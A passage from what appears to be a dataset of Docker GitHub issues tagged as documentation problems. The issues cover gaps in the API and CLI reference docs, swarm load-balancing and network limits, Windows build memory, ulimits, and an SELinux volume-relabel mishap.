info`:**\r\n\r\n```\r\ndocker info\r\n\r\nContainers: 4\r\n Running: 4\r\n Paused: 0\r\n Stopped: 0\r\nImages: 4\r\nServer Version: 1.12.3\r\nStorage Driver: aufs\r\n Root Dir: /var/lib/docker/aufs\r\n Backing Filesystem: extfs\r\n Dirs: 75\r\n Dirperm1 Supported: true\r\nLogging Driver: json-file\r\nCgroup Driver: cgroupfs\r\nPlugins:\r\n Volume: local\r\n Network: host overlay bridge null\r\nSwarm: inactive\r\nRuntimes: runc\r\nDefault Runtime: runc\r\nSecurity Options: apparmor\r\nKernel Version: 3.16.0-77-generic\r\nOperating System: Ubuntu 14.04 LTS\r\nOSType: linux\r\nArchitecture: x86_64\r\nCPUs: 24\r\nTotal Memory: 31.12 GiB\r\nName: sto3-accesspoint-a62.sto3.spotify.net\r\nID: AYPE:FMXB:2PCP:DHI4:LUOS:HA5P:SWRJ:DMDE:JLR4:C3KE:VVRU:JLMS\r\nDocker Root Dir: /var/lib/docker\r\nDebug Mode (client): false\r\nDebug Mode (server): false\r\nRegistry: https://index.docker.io/v1/\r\nWARNING: No swap limit support\r\nInsecure Registries:\r\n 127.0.0.0/8```\r\n\r\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\r\n\r\nUsing docker-machine VM on vmware on Mac Sierra.\r\n"},{"labels":[null,"documentation",null,null,null],"text":"The markdown API docs are missing any description for the `NetworkingConfig` object that is included in the config to create a container. This object is included in the example JSON that gets POSTed to `/containers/create` in the 1.22, 1.23, and 1.24 docs, but is not mentioned in the following \"JSON Parameters\" section. In particular, its child object `EndpointsConfig` is not fully defined.\r\n\r\nThis issue only affects the older markdown API docs. The objects mentioned above are defined in more detail in `api/swagger.yaml`. For the most part, the various places in the swagger description of the API that accept or produce information about networks refer to `#/definitions/EndpointSettings`.\r\n\r\n"},{"labels":["documentation"],"text":"\r\n**Description**\r\n\r\nThe placement constraints grammar is not documented.\r\n\r\n**Steps to reproduce the issue:**\r\n1. `docker help create`\r\n2.  search for \"placement constraints\" on docker.com\r\n3. \r\n\r\n**Describe the results you received:**\r\n\r\nNo documentation.\r\n\r\n**Describe the results you expected:**\r\n\r\nDocumentation of the grammar, such as how not equal is written, whether and and or can be used, and what the grammar is etc.\r\n"},{"labels":["documentation",null],"text":"PR https://github.com/docker/docker/pull/31710 adds the `--verbose` option for `network inspect` to display service level details across the cluster for swarm mode overlay networks.  `swagger.yml` has to be updated to include the types of the objects in `docker network inspect --verbose` output."},{"labels":["documentation",null,null,null],"text":"I'm opening this issue as a bug because from what I've read docker is supposed to not enforce memory or disk space limitations during container's build or run actions. \r\n\r\nI have a docker file that does a lot when building and I can't really share to help with reproducing. This docker file behaves differently on different hosts. In one of them runs out of memory which contradicts the above. To help me troubleshoot the issue I've added a cmd that reports the free memory before it runs out of memory\r\n```powershell\r\n(Get-Counter -Counter \"\\Memory\\Available MBytes\").CounterSamples[0].CookedValue\r\n```\r\n\r\n1. On my Windows 10 host (my workstation laptop) the container fails to build. The workstation has 16GB of memory. The reported free memory before the out of memory crash is 200MB.\r\n1. On a Windows 2016 on a Hyper-V instanced hosted on my workstation the container builds successfully. The Hyper-V instance is assgined 4GB of memory. The reported free memory before the out of memory crash is 538MB.\r\n1. On a Windows 2016 host on azure the container builds successfully. The Azure VM is running with 7GB. The reported free memory before the out of memory crash is 3000MB.\r\n\r\nEach of the hosts reports the following version\r\n**1. Windows 10 Host**\r\n```text\r\nClient:\r\n Version:      17.03.0-ce\r\n API version:  1.26\r\n Go version:   go1.7.5\r\n Git commit:   60ccb22\r\n Built:        Thu Feb 23 10:40:59 2017\r\n OS/Arch:      windows/amd64\r\n\r\nServer:\r\n Version:      17.03.0-ce\r\n API version:  1.26 (minimum version 1.24)\r\n Go version:   go1.7.5\r\n Git commit:   60ccb22\r\n Built:        Thu Feb 23 10:40:59 2017\r\n OS/Arch:      windows/amd64\r\n Experimental: true\r\n```\r\n\r\n**2. Windows 2016 Host on Hyper-V**\r\n```text\r\nClient:\r\n Version:      17.03.0-ee-1\r\n API version:  1.26\r\n Go version:   go1.7.5\r\n Git commit:   9094a76\r\n Built:        Wed Mar  1 00:49:51 2017\r\n OS/Arch:      windows/amd64\r\n\r\nServer:\r\n Version:      17.03.0-ee-1\r\n API version:  1.26 (minimum version 1.24)\r\n Go version:   go1.7.5\r\n Git commit:   9094a76\r\n Built:        Wed Mar  1 00:49:51 2017\r\n OS/Arch:      windows/amd64\r\n Experimental: false\r\n```\r\n\r\n**2. Windows 2016 Host on Azure**\r\n```text\r\nClient:\r\nVersion:      1.12.2-cs2-ws-beta\r\nAPI version:  1.25\r\nGo version:   go1.7.1\r\nGit commit:   050b611\r\nBuilt:        Tue Oct 11 02:35:40 2016\r\nOS/Arch:      windows/amd64\r\n\r\nServer:\r\nVersion:      1.12.2-cs2-ws-beta\r\nAPI version:  1.25\r\nGo version:   go1.7.1\r\nGit commit:   050b611\r\nBuilt:        Tue Oct 11 02:35:40 2016\r\nOS/Arch:      windows/amd64\r\n\r\n```\r\n\r\nI understand I've not provided all necessary information to help you reproduce but the artifacts being referenced in the container are not freely available. What I can additionally say, is that the same  succeeds on Windows 10 host (case 1) when building on `microsoft/windowsservercore:latest` but fails when building on `asarafian/mssql-server-windows-express:2014SP2`. The difference between the two is the extra disk space required for SQL Server 2014SP2 and the memory that the sql server process take. Keep in mind that the sql server has one very small database attached, so it's strange that it makes that big of a difference.\r\n\r\nI'm more than willing to help troubleshoot this issue but I need some help on how. My feeling is that there is a difference between how docker and containers behave between Windows 10 and Windows Server hosts. The windows 10 machine has the most memory available from all the other one and reports 8-9GB free when the our of memory is thrown. On the other hand, Windows Server 2016 manages better with less memory available to the host. As there is a difference on setting up docker for Windows 10 and Windows Server, is it possible that there some limitations for Windows 10? If so, then I would consider this bug's resolution and documentation fix because I can't find any relevant information, besides limiting the memory available to the container.\r\n"},{"labels":["documentation",null,null,null],"text":"The [Load Balancing](https://docs.docker.com/engine/swarm/key-concepts/#load-balancing) section in the swarm docs don't make it clear if the internal loadbalancer also does health checks, and if it removes nodes that aren't running the service anymore (because it got killed or the node got rebooted).\r\n\r\nIn the following case I've got a service with replicas 3, 1 instance running on each of the 3 nodes.\r\n\r\nManager:\r\n```\r\n[root@centosvm ~]# docker ps\r\nCONTAINER ID        IMAGE                                    COMMAND                  CREATED             STATUS              PORTS               NAMES\r\na593d485050a        ddewaele/springboot.crud.sample:latest   \"sh -c 'java $JAVA_OP\"   7 minutes ago       Up 7 minutes                            springbootcrudsample.1.5syc6j4c8i3bnerdqq4e1yelm\r\n```\r\nNode1:\r\n```\r\n[root@node1 ~]# docker ps\r\nCONTAINER ID        IMAGE                                    COMMAND                  CREATED             STATUS              PORTS               NAMES\r\nd3b3fbc0f2c5        ddewaele/springboot.crud.sample:latest   \"sh -c 'java $JAVA_OP\"   4 minutes ago       Up 4 minutes                            springbootcrudsample.3.7y1oyjyrifgkmxlr20oai5ppl\r\n```\r\nNode 2:\r\n```\r\n[root@node2 ~]# docker ps\r\nCONTAINER ID        IMAGE                                    COMMAND                  CREATED             STATUS              PORTS               NAMES\r\nebca8f24ec3a        ddewaele/springboot.crud.sample:latest   \"sh -c 'java $JAVA_OP\"   7 minutes ago       Up 7 minutes                            springbootcrudsample.2.4tqjad7od8ep047s55485na1t\r\n```\r\nNow, on node1, we kill the docker container. This node will be without a service (swarm will re-create it here after a couple of seconds to keep the replication=3 on the service)\r\n```\r\n[root@node1 ~]# docker kill d3b3fbc0f2c5\r\nd3b3fbc0f2c5\r\n```\r\nContainer gone\r\n```\r\n[root@node1 ~]# docker ps\r\nCONTAINER ID        IMAGE                                    COMMAND                  CREATED             STATUS              PORTS               NAMES\r\n```\r\nNew container up\r\n```\r\n[root@node1 ~]# docker ps\r\nCONTAINER ID        IMAGE                                    COMMAND                  CREATED             STATUS              PORTS               NAMES\r\nb8c9a7a5cf97        ddewaele/springboot.crud.sample:latest   \"sh -c 'java $JAVA_OP\"   11 seconds ago      Up 9 seconds                            springbootcrudsample.3.9v4cnhi8dvq7n8afb2kvp28sk\r\n```\r\n\r\nIn the output below however, when container `d3b3fbc0f2c5` was killed, the ingress  loadbalancer didn't detect this, and it was still sending traffic to the node (resulting in connection refused) ? \r\n\r\nHow should we handle such a scenario ? Do we still need an external loadbalancer for this scenario and how should we configure it ?\r\n\r\n```\r\n[root@centosvm ~]# while :; do curl http://localhost:8080/env/hostname ; echo \"\" ; sleep 1; done\r\n{\"hostname\":\"d3b3fbc0f2c5\"}\r\n{\"hostname\":\"a593d485050a\"}\r\n{\"hostname\":\"ebca8f24ec3a\"}\r\n{\"hostname\":\"d3b3fbc0f2c5\"}\r\n{\"hostname\":\"a593d485050a\"}\r\n{\"hostname\":\"ebca8f24ec3a\"}\r\n{\"hostname\":\"d3b3fbc0f2c5\"}\r\n{\"hostname\":\"a593d485050a\"}\r\n{\"hostname\":\"ebca8f24ec3a\"}\r\n{\"hostname\":\"a593d485050a\"}\r\n{\"hostname\":\"ebca8f24ec3a\"}\r\n{\"hostname\":\"a593d485050a\"}\r\ncurl: (7) Failed connect to localhost:8080; Connection refused\r\n\r\n{\"hostname\":\"ebca8f24ec3a\"}\r\n{\"hostname\":\"a593d485050a\"}\r\ncurl: (7) Failed connect to localhost:8080; Connection refused\r\n\r\n{\"hostname\":\"ebca8f24ec3a\"}\r\n{\"hostname\":\"a593d485050a\"}\r\ncurl: (7) Failed connect to localhost:8080; Connection refused\r\n\r\n{\"hostname\":\"ebca8f24ec3a\"}\r\n{\"hostname\":\"a593d485050a\"}\r\ncurl: (7) Failed connect to localhost:8080; Connection refused\r\n\r\n{\"hostname\":\"ebca8f24ec3a\"}\r\n{\"hostname\":\"a593d485050a\"}\r\ncurl: (7) Failed connect to localhost:8080; Connection refused\r\n\r\n{\"hostname\":\"ebca8f24ec3a\"}\r\n{\"hostname\":\"a593d485050a\"}\r\ncurl: (7) Failed connect to localhost:8080; Connection refused\r\n\r\n{\"hostname\":\"ebca8f24ec3a\"}\r\n{\"hostname\":\"a593d485050a\"}\r\n{\"hostname\":\"b8c9a7a5cf97\"}\r\n{\"hostname\":\"ebca8f24ec3a\"}\r\n{\"hostname\":\"a593d485050a\"}\r\n{\"hostname\":\"b8c9a7a5cf97\"}\r\n```"},{"labels":["documentation"],"text":"Hi,\r\nI was reading the docs (to get up-to-date between 1.11 and 1.13) and [here](https://docs.docker.com/engine/userguide/eng-image/dockerfile_best-practices/#/each-container-should-have-only-one-concern) I found this sentence:\r\n\r\n> In addition to the fact that containers can now be spawned with an init process, some programs might spawn additional processes of their own accord. \r\n\r\nSo I wonder, can we **really** specify an init process or does this page simply talk about the `CMD`?\r\n\r\nThe link brings nowhere hlpeful. So if it's just about the `CMD`, could we change the docs (should I click \"Edit this page\" or \"Request dos change\"?) because it is misleading :)\r\nI was really hoping that we could _finally_ have an init process :)\r\n\r\nThanks in advance :P"},{"labels":["documentation",null,null],"text":"**Description**\r\nI was refering to document related to nproc ulimit.\r\nhttps://docs.docker.com/engine/reference/commandline/run/\r\n\r\nWhen created 4th  container with ulimit nproc=3 for specific user , it gets created. \r\ndocker run -d -u daemon --ulimit nproc=3 busybox top \r\n\r\n\r\n**Steps to reproduce the issue:**\r\n1. Create 4 containers with below command\r\n    docker run -d -u daemon --ulimit nproc=3 busybox top    \r\n\r\n**Describe the results you received:**\r\nsh-4.2# docker run -d -u daemon --ulimit nproc=3 busybox top\r\nc272f84204c6a706e89dc2969c37cc1b15b0a34f08b0647786b2dc6912744734\r\nsh-4.2# docker run -d -u daemon --ulimit nproc=3 busybox top\r\n994c174d5eeedc49621c4ed29b66bd7d12dc9e2c3f68cd050ececfd0bddafe2e\r\nsh-4.2# docker run -d -u daemon --ulimit nproc=3 busybox top\r\n^[[Ac2829ec24116fa55769c4d86b5469147ff04cda4096b032932c733409dce7a2f\r\nsh-4.2# docker run -d -u daemon --ulimit nproc=3 busybox top\r\ncdeb9a71f407702966e7ecc9ec6d023c01a131fcf00776332f36550361c21255\r\nsh-4.2#\r\n\r\n\r\n**Describe the results you expected:**\r\n**Describe the results you received:**\r\nsh-4.2# docker run -d -u daemon --ulimit nproc=3 busybox top\r\nc272f84204c6a706e89dc2969c37cc1b15b0a34f08b0647786b2dc6912744734\r\nsh-4.2# docker run -d -u daemon --ulimit nproc=3 busybox top\r\n994c174d5eeedc49621c4ed29b66bd7d12dc9e2c3f68cd050ececfd0bddafe2e\r\nsh-4.2# docker run -d -u daemon --ulimit nproc=3 busybox top\r\n^[[Ac2829ec24116fa55769c4d86b5469147ff04cda4096b032932c733409dce7a2f\r\nsh-4.2# docker run -d -u daemon --ulimit nproc=3 busybox top\r\n[8] System error: resource temporarily unavailable\r\n\r\n4th container should get failed with \"[8] System error: resource temporarily unavailable\"\r\n\r\n**Output of `docker version`:**\r\nsh-4.2# docker version\r\nClient:\r\n Version:      1.13.0\r\n API version:  1.25\r\n Go version:   go1.7.3\r\n Git commit:   49bf474\r\n Built:        Tue Jan 17 09:55:28 2017\r\n OS/Arch:      linux/amd64\r\n\r\nServer:\r\n Version:      1.13.0\r\n API version:  1.25 (minimum version 1.12)\r\n Go version:   go1.7.3\r\n Git commit:   49bf474\r\n Built:        Tue Jan 17 09:55:28 2017\r\n OS/Arch:      linux/amd64\r\n Experimental: false\r\n\r\n**Output of `docker info`:**\r\nsh-4.2# docker info\r\nContainers: 4\r\n Running: 4\r\n Paused: 0\r\n Stopped: 0\r\nImages: 6\r\nServer Version: 1.13.0\r\nStorage Driver: devicemapper\r\n Pool Name: docker-253:1-1492245-pool\r\n Pool Blocksize: 65.54 kB\r\n Base Device Size: 10.74 GB\r\n Backing Filesystem: xfs\r\n Data file: /dev/loop0\r\n Metadata file: /dev/loop1\r\n Data Space Used: 56.88 GB\r\n Data Space Total: 107.4 GB\r\n Data Space Available: 28.74 GB\r\n Metadata Space Used: 135.8 MB\r\n Metadata Space Total: 2.147 GB\r\n Metadata Space Available: 2.012 GB\r\n Thin Pool Minimum Free Space: 10.74 GB\r\n Udev Sync Supported: true\r\n Deferred Removal Enabled: false\r\n Deferred Deletion Enabled: false\r\n Deferred Deleted Device Count: 0\r\n Data loop file: /var/lib/docker/devicemapper/devicemapper/data\r\n WARNING: Usage of loopback devices is strongly discouraged for production use. Use `--storage-opt dm.thinpooldev` to specify a custom block storage device.\r\n Metadata loop file: /var/lib/docker/devicemapper/devicemapper/metadata\r\n Library Version: 1.02.107-RHEL7 (2016-06-09)\r\nLogging Driver: syslog\r\nCgroup Driver: cgroupfs\r\nPlugins:\r\n Volume: local\r\n Network: bridge host macvlan null overlay\r\nSwarm: inactive\r\nRuntimes: runc\r\nDefault Runtime: runc\r\nInit Binary: docker-init\r\ncontainerd version: 03e5862ec0d8d3b3f750e19fca3ee367e13c090e\r\nrunc version: 2f7393a47307a16f8cee44a37b262e8b81021e3e\r\ninit version: 949e6fa\r\nSecurity Options:\r\n seccomp\r\n  Profile: default\r\nKernel Version: 3.10.0-327.22.2.el7.x86_64\r\nOperating System: CentOS Linux 7 (Core)\r\nOSType: linux\r\nArchitecture: x86_64\r\nCPUs: 4\r\nTotal Memory: 7.797 GiB\r\nName: gsljumphost.cisco.com\r\nID: LIZX:TKX5:IBZC:B3SF:BVLE:JGQ5:2GAG:OHSF:PM5H:ASYI:DISB:ZOM2\r\nDocker Root Dir: /var/lib/docker\r\nDebug Mode (client): false\r\nDebug Mode (server): false\r\nRegistry: https://index.docker.io/v1/\r\nWARNING: bridge-nf-call-iptables is disabled\r\nWARNING: bridge-nf-call-ip6tables is disabled\r\nExperimental: false\r\nInsecure Registries:\r\n 127.0.0.0/8\r\nLive Restore Enabled: false\r\n"},{"labels":["documentation",null,null],"text":"`docker stack ps` docs are sparse in examples.\r\nhttps://github.com/docker/docker/blob/master/docs/reference/commandline/stack_ps.md#examples\r\n\r\nIt would be good to have concrete examples similar to `docker service ps` and use them in the filtering logic. https://github.com/docker/docker/blob/master/docs/reference/commandline/service_ps.md#examples"},{"labels":["documentation"],"text":"The `CopyToContainer` method's documentation simply states the following:\r\n> CopyToContainer copies content into the container filesystem.\r\n\r\nHowever, the [API endpoint's documentation](https://docs.docker.com/engine/api/v1.24/index.html#extract-an-archive-of-files-or-folders-to-a-directory-in-a-container) states the endpoint only accepts tarballs. The code in the `cli` package using `CopyToContainer` clearly shows files being archived to a tarball as well.\r\n\r\nI think `CopyToContainer`'s documentation should reflect that it expects the `content` argument to be a tarball.\r\n"},{"labels":["documentation"],"text":"**Description**\r\n\r\nWhile compile the latest YAML files for docs, the following CLI reference files were found to be missing:\r\n\r\n* [ ] docs/reference/commandline/checkpoint/create.md\r\n* [ ] docs/reference/commandline/checkpoint/ls.md\r\n* [ ] docs/reference/commandline/checkpoint/rm.md\r\n* [ ] docs/reference/commandline/checkpoint.md\r\n* [ ] docs/reference/commandline/container/attach.md\r\n* [ ] docs/reference/commandline/container/commit.md\r\n* [ ] docs/reference/commandline/container/cp.md\r\n* [ ] docs/reference/commandline/container/create.md\r\n* [ ] docs/reference/commandline/container/diff.md\r\n* [ ] docs/reference/commandline/container/exec.md\r\n* [ ] docs/reference/commandline/container/export.md\r\n* [ ] docs/reference/commandline/container/inspect.md\r\n* [ ] docs/reference/commandline/container/kill.md\r\n* [ ] docs/reference/commandline/container/logs.md\r\n* [ ] docs/reference/commandline/container/ls.md\r\n* [ ] docs/reference/commandline/container/pause.md\r\n* [ ] docs/reference/commandline/container/port.md\r\n* [ ] docs/reference/commandline/container/prune.md\r\n* [ ] docs/reference/commandline/container/rename.md\r\n* [ ] docs/reference/commandline/container/restart.md\r\n* [ ] docs/reference/commandline/container/rm.md\r\n* [ ] docs/reference/commandline/container/run.md\r\n* [ ] docs/reference/commandline/container/start.md\r\n* [ ] docs/reference/commandline/container/stats.md\r\n* [ ] docs/reference/commandline/container/stop.md\r\n* [ ] docs/reference/commandline/container/top.md\r\n* [ ] docs/reference/commandline/container/unpause.md\r\n* [ ] docs/reference/commandline/container/update.md\r\n* [ ] docs/reference/commandline/container/wait.md\r\n* [ ] docs/reference/commandline/container.md\r\n* [ ] docs/reference/commandline/image/build.md\r\n* [ ] docs/reference/commandline/image/history.md\r\n* [ ] docs/reference/commandline/image/import.md\r\n* [ ] docs/reference/commandline/image/inspect.md\r\n* [ ] docs/reference/commandline/image/load.md\r\n* [ ] docs/reference/commandline/image/ls.md\r\n* [ ] docs/reference/commandline/image/prune.md\r\n* [ ] docs/reference/commandline/image/pull.md\r\n* [ ] docs/reference/commandline/image/push.md\r\n* [ ] docs/reference/commandline/image/rm.md\r\n* [ ] docs/reference/commandline/image/save.md\r\n* [ ] docs/reference/commandline/image/tag.md\r\n* [ ] docs/reference/commandline/image.md\r\n* [ ] docs/reference/commandline/network/connect.md\r\n* [ ] docs/reference/commandline/network/create.md\r\n* [ ] docs/reference/commandline/network/disconnect.md\r\n* [ ] docs/reference/commandline/network/inspect.md\r\n* [ ] docs/reference/commandline/network/ls.md\r\n* [ ] docs/reference/commandline/network/prune.md\r\n* [ ] docs/reference/commandline/network/rm.md\r\n* [ ] docs/reference/commandline/network.md\r\n* [ ] docs/reference/commandline/node/demote.md\r\n* [ ] docs/reference/commandline/node/inspect.md\r\n* [ ] docs/reference/commandline/node/ls.md\r\n* [ ] docs/reference/commandline/node/promote.md\r\n* [ ] docs/reference/commandline/node/ps.md\r\n* [ ] docs/reference/commandline/node/rm.md\r\n* [ ] docs/reference/commandline/node/update.md\r\n* [ ] docs/reference/commandline/node.md\r\n* [ ] docs/reference/commandline/plugin/create.md\r\n* [ ] docs/reference/commandline/plugin/disable.md\r\n* [ ] docs/reference/commandline/plugin/enable.md\r\n* [ ] docs/reference/commandline/plugin/inspect.md\r\n* [ ] docs/reference/commandline/plugin/install.md\r\n* [ ] docs/reference/commandline/plugin/ls.md\r\n* [ ] docs/reference/commandline/plugin/push.md\r\n* [ ] docs/reference/commandline/plugin/rm.md\r\n* [ ] docs/reference/commandline/plugin/set.md\r\n* [ ] docs/reference/commandline/plugin/upgrade.md\r\n* [ ] docs/reference/commandline/plugin.md\r\n* [ ] docs/reference/commandline/secret/create.md\r\n* [ ] docs/reference/commandline/secret/inspect.md\r\n* [ ] docs/reference/commandline/secret/ls.md\r\n* [ ] docs/reference/commandline/secret/rm.md\r\n* [ ] docs/reference/commandline/secret.md\r\n* [ ] docs/reference/commandline/service/create.md\r\n* [ ] docs/reference/commandline/service/inspect.md\r\n* [ ] docs/reference/commandline/service/logs.md\r\n* [ ] docs/reference/commandline/service/ls.md\r\n* [ ] docs/reference/commandline/service/ps.md\r\n* [ ] docs/reference/commandline/service/rm.md\r\n* [ ] docs/reference/commandline/service/scale.md\r\n* [ ] docs/reference/commandline/service/update.md\r\n* [ ] docs/reference/commandline/service.md\r\n* [ ] docs/reference/commandline/stack/deploy.md\r\n* [ ] docs/reference/commandline/stack/ls.md\r\n* [ ] docs/reference/commandline/stack/ps.md\r\n* [ ] docs/reference/commandline/stack/rm.md\r\n* [ ] docs/reference/commandline/stack/services.md\r\n* [ ] docs/reference/commandline/stack.md\r\n* [ ] docs/reference/commandline/swarm/init.md\r\n* [ ] docs/reference/commandline/swarm/join.md\r\n* [ ] docs/reference/commandline/swarm/join-token.md\r\n* [ ] docs/reference/commandline/swarm/leave.md\r\n* [ ] docs/reference/commandline/swarm/unlock.md\r\n* [ ] docs/reference/commandline/swarm/unlock-key.md\r\n* [ ] docs/reference/commandline/swarm/update.md\r\n* [ ] docs/reference/commandline/swarm.md\r\n* [ ] docs/reference/commandline/system/df.md\r\n* [ ] docs/reference/commandline/system/events.md\r\n* [ ] docs/reference/commandline/system/info.md\r\n* [ ] docs/reference/commandline/system/prune.md\r\n* [ ] docs/reference/commandline/system.md\r\n* [ ] docs/reference/commandline/volume/create.md\r\n* [ ] docs/reference/commandline/volume/inspect.md\r\n* [ ] docs/reference/commandline/volume/ls.md\r\n* [ ] docs/reference/commandline/volume/prune.md\r\n* [ ] docs/reference/commandline/volume/rm.md\r\n* [ ] docs/reference/commandline/volume.md\r\n\r\n**Steps to reproduce the issue:**\r\n1. In a terminal get the help for `docker volume --help`\r\n2. Notice you get some help\r\n3. try to find the matching CLI ref in the docs reference folder and you'll see that https://github.com/docker/docker/blob/master/docs/reference/commandline/volume.md is missing\r\n\r\n**Describe the results you received:**\r\n404 page not found\r\n\r\n**Describe the results you expected:**\r\nto find the matching Markdown file for the above command\r\n"},{"labels":["documentation",null,null],"text":"I am running docker version v1.13.0 with swarm (stand alone), the old swarm.\r\n\r\nWe have an overlay network and it seems that we can't create more than 255 containers. We get the following error:\r\n\r\n**Cannot start service logsparser: Error response from daemon: no available IPv4 addresses on this network's address pools**\r\n\r\n\r\nIs it a bug? Is there a way to increase this limitation?\r\n\r\nI attached 2 files with the output of:\r\n\r\ndocker info\r\n\r\nand\r\n\r\ndocker network inspect\r\n\r\n[d_info.txt](https://github.com/docker/docker/files/775585/d_info.txt)\r\n[d_network_inspect.txt](https://github.com/docker/docker/files/775586/d_network_inspect.txt)\r\n\r\n\r\n\r\n"},{"labels":["documentation"],"text":"<!--\r\nIf you are reporting a new issue, make sure that we do not have any duplicates\r\nalready open. You can ensure this by searching the issue list for this\r\nrepository. If there is a duplicate, please close your issue and add a comment\r\nto the existing issue instead.\r\n\r\nIf you suspect your issue is a bug, please edit your issue description to\r\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\r\ninformation within 7 days, we cannot debug your issue and will close it. We\r\nwill, however, reopen it if you later provide the information.\r\n\r\nFor more information about reporting issues, see\r\nhttps://github.com/docker/docker/blob/master/CONTRIBUTING.md#reporting-other-issues\r\n\r\n---------------------------------------------------\r\nGENERAL SUPPORT INFORMATION\r\n---------------------------------------------------\r\n\r\nThe GitHub issue tracker is for bug reports and feature requests.\r\nGeneral support can be found at the following locations:\r\n\r\n- Docker Support Forums - https://forums.docker.com\r\n- IRC - irc.freenode.net #docker channel\r\n- Post a question on StackOverflow, using the Docker tag\r\n\r\n---------------------------------------------------\r\nBUG REPORT INFORMATION\r\n---------------------------------------------------\r\nUse the commands below to provide key information from your environment:\r\nYou do NOT have to include this information if this is a FEATURE REQUEST\r\n-->\r\n\r\n**Description**\r\n\r\nThe dockerd docs don't mention the new experimental flag and what features that enables (https://docs.docker.com/engine/reference/commandline/dockerd/), and the README in the repo (https://github.com/docker/docker/tree/master/experimental) is missing a lot of the new experimental features added in 1.13, e.g. see https://sreeninet.wordpress.com/2017/01/27/docker-1-13-experimental-features/.\r\n\r\nAlso, the experimental README  says \"Experimental features are not ready for production. They are provided for test and evaluation in your sandbox environments.\". That doesn't seem to match what I've heard from maintainers that experimental features are (now) considered behaviorally stable; just the API/CLI might change. E.g. see https://github.com/docker/docker/issues/26451#issuecomment-249294540"},{"labels":["documentation",null,null],"text":"Hey there,\r\n\r\nWhile this isn't a bug per se, it's _really_ unexpected behaviour of a Docker run command and I believe it deserves some attention, and at the _very_ least some clarification in the manual and steps to try and resolve the problem.\r\n\r\n======\r\n\r\nTl;dr, `:z` and `:Z` can cause the system to disallow logins by changing labels (until a reboot at least) without so much as a warning or a single line of output.\r\n\r\n======\r\n\r\nI run a CentOS 7.3 VM in Azure for testing out Docker boxes and making new ones (plus a few other bits and pieces)\r\n\r\nToday I ran a `docker run` (something similar to `docker run -v $PWD:/var/www:z -it <sha256 here> php -v`) in my home directory root (not usually where I run it) by doing a `^R` and searching for a command.\r\nBecause `$PWD` resolved to the my home dir the `:z` relabelled my _entire_ home directory with Docker's shared label. I wondered why the command took _so_ long to run, but didn't think much of it at the time.\r\nI walked away from my machine and (luckily) left my ssh session on. Later on I tried to log into the server from my phone and couldn't.\r\n\r\nAfter running back upstairs and some frantic defensive actions over the system (looking at `authorized_keys` files for tampering, audit logs, checking fail2ban, etc.) I decided the system had not been hacked into and my keys weren't compromised.\r\n\r\nEventually after searching around I noticed that `sshd` was being denied `read` to the `authorized_keys` file by SELinux because of the label change!\r\n\r\nAfter a `chcon -RFvv /home/username` I could log in again.\r\n\r\n======\r\n\r\nWhile it's obvious that those options were changing the labels on the _host_, I didn't realise until this point. The manual on [Volume Labels](https://docs.docker.com/engine/tutorials/dockervolumes/#/volume-labels) mentions about changing host's labels, but doesn't mention how dangerous this is and that if you can't log into the system a reboot or a relabel will be needed... (What if this was a system I couldn't / couldn't easily reboot?)\r\n\r\nIt's possible the manual also should explicitly list the two labels that are assigned for public and private mounts, so that people who don't want to use `:z` or `:Z` can manually label the files beforehand, which'd be safer and also can be put into the permanent policy of the machine.\r\n\r\nThanks."},{"labels":[null,"documentation",null],"text":"from my personal experience using the tooling. it would be great if these were resolved. please, do not take these as criticism.\r\n\r\n#### output:\r\n\r\ni  wonder how everyone deals with the docker ouput, in particular the core team. i suspect, i could be wrong, that people are handcrafting scripts for common operations.\r\n\r\ndealing with the ouput in a *unix env could be easier:\r\n\r\n* requires extra work when using common tools, e.g., `docker history <id>` -> `SIZE` contains spaces so `sort -h` doesn't handle it that well. one needs to do deal with Go templates.\r\n* some commands don't take formatting options so they're harder to deal with, e.g., `docker history`.\r\n* is there a standard delimiter that is always used for all the commands? quick test: remove just the `COMMENT` column, note the space(s) in the fields themselves.\r\n\r\n```sh\r\n$ docker history golang_1.4-alpine:latest\r\nIMAGE               CREATED             CREATED BY                                      SIZE                COMMENT\r\nf687c7a9c8fd        22 hours ago        /bin/sh -c echo 'hello world from' 'golang...   0 B                 \r\n0deea0c51a1c        11 months ago       /bin/sh -c #(nop) WORKDIR /go                   0 B                 \r\n<missing>           11 months ago       /bin/sh -c mkdir -p \"$GOPATH/src\" \"$GOPATH...   0 B                 \r\n<missing>           11 months ago       /bin/sh -c #(nop) ENV PATH=/go/bin:/usr/lo...   0 B                 \r\n<missing>           11 months ago       /bin/sh -c #(nop) ENV GOPATH=/go                0 B                 \r\n<missing>           11 months ago       /bin/sh -c set -ex  && apk add --no-cache ...   138 MB              \r\n<missing>           11 months ago       /bin/sh -c #(nop) ENV GOLANG_SRC_SHA1=486d...   0 B                 \r\n<missing>           11 months ago       /bin/sh -c #(nop) ENV GOLANG_SRC_URL=https...   0 B                 \r\n<missing>           11 months ago       /bin/sh -c #(nop) ENV GOLANG_VERSION=1.4.3      0 B                 \r\n<missing>           11 months ago       /bin/sh -c #(nop) ADD file:0f9cfb2e848f093...   4.79 MB             \r\n```\r\n\r\nwhat i'm trying to get at is, it would nice if the output played nicely with the tools folks are familiar with, and some consistent behaviour in the flags commands take (some take `--format` other don't).\r\n\r\n#### documentation\r\n\r\n#### aliasing\r\n\r\nthe alias, specifically, at the bottom is confusing, e.g., https://docs.docker.com/engine/reference/commandline/images/ says `docker images` -> ` docker image ls`:\r\n\r\n* why not then just redirect to the page?\r\n* the alias should be at the top of the page, it is less confusing that way.\r\n\r\n#### links to docs\r\n\r\nit would _really_ nice to have links to the docs directly (not the alias) available on the command line. something like below, or whatever fits your bill.\r\n\r\n```sh\r\n$ docker images --help\r\n\r\nhttps://docs.docker.com/engine/reference/commandline/image_ls/\r\n\r\nUsage:\tdocker images [OPTIONS] [REPOSITORY[:TAG]]\r\n\r\n...\r\n```\r\n\r\n---\r\n\r\n```sh\r\n$ docker version\r\n```\r\n\r\n```sh\r\nClient:\r\n Version:      1.13.0\r\n API version:  1.25\r\n Go version:   go1.7.3\r\n Git commit:   49bf474\r\n Built:        Wed Jan 18 16:20:26 2017\r\n OS/Arch:      darwin/amd64\r\n\r\nServer:\r\n Version:      1.13.0\r\n API version:  1.25 (minimum version 1.12)\r\n Go version:   go1.7.3\r\n Git commit:   49bf474\r\n Built:        Wed Jan 18 16:20:26 2017\r\n OS/Arch:      linux/amd64\r\n Experimental: true\r\n```\r\n\r\n```sh\r\n$ docker 